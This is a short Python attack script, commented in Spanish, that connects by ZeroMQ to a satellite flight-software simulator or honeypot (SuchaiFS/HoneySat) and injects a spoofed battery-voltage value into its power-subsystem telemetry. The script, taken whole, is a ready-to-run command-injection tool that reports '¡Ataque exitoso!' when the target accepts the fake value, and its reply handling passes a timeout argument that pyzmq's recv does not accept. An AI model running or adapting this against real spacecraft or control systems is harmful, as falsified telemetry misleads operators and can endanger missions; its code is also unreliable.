import zmq
import struct
import sys

def inject_vbat(target_ip, fake_mv):
    context = zmq.Context()
    socket = context.socket(zmq.REQ)
    # El puerto 5555 es donde SuchaiFS y HoneySat se comunican
    socket.connect(f"tcp://{target_ip}:5555")

    # Protocolo: [ID_DISPOSITIVO, DIRECCION_COMANDO, VALOR_4_BYTES]
    # SIM_EPS_ID = 0x02
    # SIM_EPS_ADDR_SPOOF = 0x04
    payload = struct.pack('bb i', 0x02, 0x04, fake_mv)
    
    print(f"Enviando inyección de datos a {target_ip}...")
    print(f"Payload: {payload.hex()} (Set VBat to {fake_mv} mV)")
    
    socket.send(payload)
    
    try:
        reply = socket.recv(timeout=2000)
        status = struct.unpack('i', reply)[0]
        if status == 1:
            print("¡Ataque exitoso! El satélite ahora reportará el valor falso.")
        else:
            print("El satélite rechazó el comando.")
    except zmq.error.Again:
        print("Error: El satélite no respondió (Timeout).")
    finally:
        socket.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python3 ataque_inyeccion_vbat.py <IP_SATELITE> <VALOR_MV>")
        print("Ejemplo: python3 ataque_inyeccion_vbat.py 10.0.0.1 2500")
        sys.exit(1)
    
    target = sys.argv[1]
    value = int(sys.argv[2])
    inject_vbat(target, value)
